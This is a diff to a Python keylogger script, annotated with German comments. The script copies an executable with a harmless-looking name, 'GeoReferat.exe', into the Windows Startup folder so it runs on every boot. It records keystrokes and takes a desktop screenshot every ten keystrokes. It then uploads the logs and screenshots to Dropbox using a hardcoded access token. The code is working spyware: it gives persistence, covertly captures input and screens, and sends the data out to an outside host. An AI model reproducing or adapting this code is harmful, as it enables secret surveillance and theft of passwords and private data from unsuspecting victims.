@@ -18,7 +18,8 @@ if sys.argv[-1] != ASADMIN:
 
 
 #pyfile = "C:/Users/Louis/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Autostart"
-os.system("move GeoReferat.exe C:/Users/Louis/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")
+os.system("move GeoReferat.exe C:/Users/Louis/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")  #Python.exe Datei wird in Autostart Ordner gelegt und  
+                                                                                                               #der Keylogger starten dadurch automatisch 
 
 x = 0
 
@@ -27,11 +28,12 @@ while True:
     x = x + 1
     filename = ("log" + str(x) + ".txt")
     file = open(filename, "w+")
-    print(filename)
+    print(filename)                              #Alle Tastenanschläge werden aufgenommen und in eine Datei geschrieben, diese Datei wird dann in die Eigene Dropbox 
+                                                 #geladen
     file = open(filename, "r+")
     file.write(str(date))
 
-    picname = ("pic" + str(x) + ".png")
+    picname = ("pic" + str(x) + ".png")          #Nach Immer 10 Tastenanschlägen wird Screeshot vom Desktop gemacht
     picture = pyautogui.screenshot(picname)
 
 
@@ -55,14 +57,14 @@ while True:
     db = dropbox.Dropbox('TIBvKrzWikAAAAAAAAAAAVC0ZwZnrZXmPIFWxwS7qb-zhYsSm7ucPTyu9NS3uJYE')
     fname = str(filename)
     dname = "/" + "Logs/" + filename
-    f = open(fname, 'rb')
+    f = open(fname, 'rb')                                    #Datei wird in Dropbox geladen
     response = db.files_upload(f.read(), dname)
     print('upload:', response)
     f.close()
 
     f2name = str(picname)
     print(picname)
-    d2name = "/" + "Screenshots/" + picname
+    d2name = "/" + "Screenshots/" + picname                  #Screenshot wird in Dropbox geladen
     f2 = open(f2name, 'rb')
     res = db.files_upload(f2.read(), d2name)
     print(res)
